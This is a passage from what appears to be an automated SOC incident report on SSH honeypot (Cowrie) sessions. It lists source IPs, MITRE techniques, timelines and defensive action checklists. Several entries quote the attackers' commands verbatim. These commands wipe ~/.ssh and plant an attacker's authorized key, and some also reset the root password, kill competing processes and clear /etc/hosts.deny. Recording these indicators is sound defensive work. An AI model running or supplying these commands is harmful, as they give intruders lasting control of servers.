- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab3094098098

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 03:40 |
| **Last Seen** | 2026-03-28 03:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:40:11` | `cowrie.session.connect` |
| `2026-03-28 03:40:11` | `cowrie.client.version` |
| `2026-03-28 03:40:11` | `cowrie.client.kex` |
| `2026-03-28 03:40:11` | `cowrie.login.success` |
| `2026-03-28 03:40:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa8a6bfd0a65

| Field | Detail |
|---|---|
| **Source IP** | `180.76.143[.]203` |
| **First Seen** | 2026-03-28 03:41 |
| **Last Seen** | 2026-03-28 03:41 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:41:46` | `cowrie.session.connect` |
| `2026-03-28 03:41:46` | `cowrie.client.version` |
| `2026-03-28 03:41:47` | `cowrie.client.kex` |
| `2026-03-28 03:41:48` | `cowrie.login.success` |
| `2026-03-28 03:41:48` | `cowrie.session.params` |
| `2026-03-28 03:41:48` | `cowrie.command.input` |
| `2026-03-28 03:41:48` | `cowrie.command.failed` |
| `2026-03-28 03:41:50` | `cowrie.log.closed` |
| `2026-03-28 03:41:50` | `cowrie.session.params` |
| `2026-03-28 03:41:50` | `cowrie.command.input` |
| `2026-03-28 03:41:51` | `cowrie.session.file_download` |
| `2026-03-28 03:41:51` | `cowrie.log.closed` |
| `2026-03-28 03:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.143[.]203` to AbuseIPDB if not already reported
- [ ] Block `180.76.143[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f51875a85418

| Field | Detail |
|---|---|
| **Source IP** | `180.76.143[.]203` |
| **First Seen** | 2026-03-28 03:41 |
| **Last Seen** | 2026-03-28 03:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:41:55` | `cowrie.session.connect` |
| `2026-03-28 03:41:55` | `cowrie.client.version` |
| `2026-03-28 03:41:55` | `cowrie.client.kex` |
| `2026-03-28 03:41:58` | `cowrie.login.success` |
| `2026-03-28 03:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.143[.]203` to AbuseIPDB if not already reported
- [ ] Block `180.76.143[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fee68c1ee4d

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 03:45 |
| **Last Seen** | 2026-03-28 03:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:45:26` | `cowrie.session.connect` |
| `2026-03-28 03:45:26` | `cowrie.client.version` |
| `2026-03-28 03:45:26` | `cowrie.client.kex` |
| `2026-03-28 03:45:27` | `cowrie.login.success` |
| `2026-03-28 03:45:27` | `cowrie.session.params` |
| `2026-03-28 03:45:27` | `cowrie.command.input` |
| `2026-03-28 03:45:27` | `cowrie.command.failed` |
| `2026-03-28 03:45:27` | `cowrie.log.closed` |
| `2026-03-28 03:45:27` | `cowrie.session.params` |
| `2026-03-28 03:45:27` | `cowrie.command.input` |
| `2026-03-28 03:45:27` | `cowrie.session.file_download` |
| `2026-03-28 03:45:27` | `cowrie.log.closed` |
| `2026-03-28 03:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e922179a39a9

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 03:45 |
| **Last Seen** | 2026-03-28 03:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:45:29` | `cowrie.session.connect` |
| `2026-03-28 03:45:29` | `cowrie.client.version` |
| `2026-03-28 03:45:29` | `cowrie.client.kex` |
| `2026-03-28 03:45:30` | `cowrie.login.success` |
| `2026-03-28 03:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9db66794e17

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 03:50 |
| **Last Seen** | 2026-03-28 03:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:50:45` | `cowrie.session.connect` |
| `2026-03-28 03:50:45` | `cowrie.client.version` |
| `2026-03-28 03:50:45` | `cowrie.client.kex` |
| `2026-03-28 03:50:45` | `cowrie.login.success` |
| `2026-03-28 03:50:46` | `cowrie.session.params` |
| `2026-03-28 03:50:46` | `cowrie.command.input` |
| `2026-03-28 03:50:46` | `cowrie.command.failed` |
| `2026-03-28 03:50:46` | `cowrie.log.closed` |
| `2026-03-28 03:50:46` | `cowrie.session.params` |
| `2026-03-28 03:50:46` | `cowrie.command.input` |
| `2026-03-28 03:50:46` | `cowrie.session.file_download` |
| `2026-03-28 03:50:46` | `cowrie.log.closed` |
| `2026-03-28 03:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3c7ca11dd42

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 03:50 |
| **Last Seen** | 2026-03-28 03:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:50:48` | `cowrie.session.connect` |
| `2026-03-28 03:50:48` | `cowrie.client.version` |
| `2026-03-28 03:50:48` | `cowrie.client.kex` |
| `2026-03-28 03:50:48` | `cowrie.login.success` |
| `2026-03-28 03:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98f075e207a0

| Field | Detail |
|---|---|
| **Source IP** | `62.60.244[.]109` |
| **First Seen** | 2026-03-28 03:56 |
| **Last Seen** | 2026-03-28 03:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:56:25` | `cowrie.session.connect` |
| `2026-03-28 03:56:25` | `cowrie.client.version` |
| `2026-03-28 03:56:25` | `cowrie.client.kex` |
| `2026-03-28 03:56:26` | `cowrie.login.success` |
| `2026-03-28 03:56:26` | `cowrie.session.params` |
| `2026-03-28 03:56:26` | `cowrie.command.input` |
| `2026-03-28 03:56:26` | `cowrie.command.failed` |
| `2026-03-28 03:56:26` | `cowrie.log.closed` |
| `2026-03-28 03:56:27` | `cowrie.session.params` |
| `2026-03-28 03:56:27` | `cowrie.command.input` |
| `2026-03-28 03:56:27` | `cowrie.session.file_download` |
| `2026-03-28 03:56:27` | `cowrie.log.closed` |
| `2026-03-28 03:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.60.244[.]109` to AbuseIPDB if not already reported
- [ ] Block `62.60.244[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02343b5b0d1b

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 03:56 |
| **Last Seen** | 2026-03-28 03:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:56:27` | `cowrie.session.connect` |
| `2026-03-28 03:56:27` | `cowrie.client.version` |
| `2026-03-28 03:56:27` | `cowrie.client.kex` |
| `2026-03-28 03:56:27` | `cowrie.login.success` |
| `2026-03-28 03:56:27` | `cowrie.session.params` |
| `2026-03-28 03:56:27` | `cowrie.command.input` |
| `2026-03-28 03:56:27` | `cowrie.command.failed` |
| `2026-03-28 03:56:27` | `cowrie.log.closed` |
| `2026-03-28 03:56:28` | `cowrie.session.params` |
| `2026-03-28 03:56:28` | `cowrie.command.input` |
| `2026-03-28 03:56:28` | `cowrie.session.file_download` |
| `2026-03-28 03:56:28` | `cowrie.log.closed` |
| `2026-03-28 03:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c0678fe6c7e

| Field | Detail |
|---|---|
| **Source IP** | `62.60.244[.]109` |
| **First Seen** | 2026-03-28 03:56 |
| **Last Seen** | 2026-03-28 03:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:56:29` | `cowrie.session.connect` |
| `2026-03-28 03:56:29` | `cowrie.client.version` |
| `2026-03-28 03:56:29` | `cowrie.client.kex` |
| `2026-03-28 03:56:30` | `cowrie.login.success` |
| `2026-03-28 03:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.60.244[.]109` to AbuseIPDB if not already reported
- [ ] Block `62.60.244[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fc110e42c0c

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 03:56 |
| **Last Seen** | 2026-03-28 03:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 03:56:30` | `cowrie.session.connect` |
| `2026-03-28 03:56:30` | `cowrie.client.version` |
| `2026-03-28 03:56:30` | `cowrie.client.kex` |
| `2026-03-28 03:56:31` | `cowrie.login.success` |
| `2026-03-28 03:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57ca281ac150

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 04:02 |
| **Last Seen** | 2026-03-28 04:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 04:02:07` | `cowrie.session.connect` |
| `2026-03-28 04:02:07` | `cowrie.client.version` |
| `2026-03-28 04:02:07` | `cowrie.client.kex` |
| `2026-03-28 04:02:08` | `cowrie.login.success` |
| `2026-03-28 04:02:08` | `cowrie.session.params` |
| `2026-03-28 04:02:08` | `cowrie.command.input` |
| `2026-03-28 04:02:08` | `cowrie.command.failed` |
| `2026-03-28 04:02:08` | `cowrie.log.closed` |
| `2026-03-28 04:02:08` | `cowrie.session.params` |
| `2026-03-28 04:02:08` | `cowrie.command.input` |
| `2026-03-28 04:02:08` | `cowrie.session.file_download` |
| `2026-03-28 04:02:08` | `cowrie.log.closed` |
| `2026-03-28 04:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaef82182347

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 04:02 |
| **Last Seen** | 2026-03-28 04:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 04:02:10` | `cowrie.session.connect` |
| `2026-03-28 04:02:10` | `cowrie.client.version` |
| `2026-03-28 04:02:10` | `cowrie.client.kex` |
| `2026-03-28 04:02:11` | `cowrie.login.success` |
| `2026-03-28 04:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49a0d80fbbaa

| Field | Detail |
|---|---|
| **Source IP** | `180.76.143[.]203` |
| **First Seen** | 2026-03-28 04:03 |
| **Last Seen** | 2026-03-28 04:04 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:TguJCA3A3a6g"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 04:03:42` | `cowrie.session.connect` |
| `2026-03-28 04:03:42` | `cowrie.client.version` |
| `2026-03-28 04:03:43` | `cowrie.client.kex` |
| `2026-03-28 04:03:46` | `cowrie.login.success` |
| `2026-03-28 04:03:48` | `cowrie.session.params` |
| `2026-03-28 04:03:48` | `cowrie.command.input` |
| `2026-03-28 04:03:48` | `cowrie.command.failed` |
| `2026-03-28 04:03:48` | `cowrie.log.closed` |
| `2026-03-28 04:03:50` | `cowrie.session.params` |
| `2026-03-28 04:03:50` | `cowrie.command.input` |
| `2026-03-28 04:03:50` | `cowrie.session.file_download` |
| `2026-03-28 04:03:50` | `cowrie.log.closed` |
| `2026-03-28 04:04:02` | `cowrie.session.params` |
| `2026-03-28 04:04:02` | `cowrie.command.input` |
| `2026-03-28 04:04:02` | `cowrie.log.closed` |
| `2026-03-28 04:04:03` | `cowrie.session.params` |
| `2026-03-28 04:04:03` | `cowrie.command.input` |
| `2026-03-28 04:04:03` | `cowrie.log.closed` |
| `2026-03-28 04:04:04` | `cowrie.session.params` |
| `2026-03-28 04:04:04` | `cowrie.command.input` |
| `2026-03-28 04:04:04` | `cowrie.session.file_download` |
| `2026-03-28 04:04:04` | `cowrie.log.closed` |
| `2026-03-28 04:04:05` | `cowrie.session.params` |
| `2026-03-28 04:04:05` | `cowrie.command.input` |
| `2026-03-28 04:04:05` | `cowrie.log.closed` |
| `2026-03-28 04:04:05` | `cowrie.session.params` |
| `2026-03-28 04:04:05` | `cowrie.command.input` |
| `2026-03-28 04:04:05` | `cowrie.log.closed` |
| `2026-03-28 04:04:06` | `cowrie.session.params` |
| `2026-03-28 04:04:06` | `cowrie.command.input` |
| `2026-03-28 04:04:06` | `cowrie.command.input` |
| `2026-03-28 04:04:08` | `cowrie.log.closed` |
| `2026-03-28 04:04:09` | `cowrie.session.params` |
| `2026-03-28 04:04:09` | `cowrie.command.input` |
| `2026-03-28 04:04:09` | `cowrie.log.closed` |
| `2026-03-28 04:04:10` | `cowrie.session.params` |
| `2026-03-28 04:04:10` | `cowrie.command.input` |
| `2026-03-28 04:04:10` | `cowrie.log.closed` |
| `2026-03-28 04:04:10` | `cowrie.session.params` |
| `2026-03-28 04:04:10` | `cowrie.command.input` |
| `2026-03-28 04:04:10` | `cowrie.log.closed` |
| `2026-03-28 04:04:11` | `cowrie.session.params` |
| `2026-03-28 04:04:11` | `cowrie.command.input` |
| `2026-03-28 04:04:11` | `cowrie.log.closed` |
| `2026-03-28 04:04:12` | `cowrie.session.params` |
| `2026-03-28 04:04:12` | `cowrie.command.input` |
| `2026-03-28 04:04:12` | `cowrie.log.closed` |
| `2026-03-28 04:04:13` | `cowrie.session.params` |
| `2026-03-28 04:04:13` | `cowrie.command.input` |
| `2026-03-28 04:04:13` | `cowrie.log.closed` |
| `2026-03-28 04:04:14` | `cowrie.session.params` |
| `2026-03-28 04:04:14` | `cowrie.command.input` |
| `2026-03-28 04:04:14` | `cowrie.log.closed` |
| `2026-03-28 04:04:17` | `cowrie.session.params` |
| `2026-03-28 04:04:17` | `cowrie.command.input` |
| `2026-03-28 04:04:17` | `cowrie.log.closed` |
| `2026-03-28 04:04:18` | `cowrie.session.params` |
| `2026-03-28 04:04:18` | `cowrie.command.input` |
| `2026-03-28 04:04:18` | `cowrie.log.closed` |
| `2026-03-28 04:04:19` | `cowrie.session.params` |
| `2026-03-28 04:04:19` | `cowrie.command.input` |
| `2026-03-28 04:04:20` | `cowrie.log.closed` |
| `2026-03-28 04:04:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.143[.]203` to AbuseIPDB if not already reported
- [ ] Block `180.76.143[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15b6b22f989f

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-03-28 04:07 |
| **Last Seen** | 2026-03-28 04:07 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:f2NseE1EdC7E"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
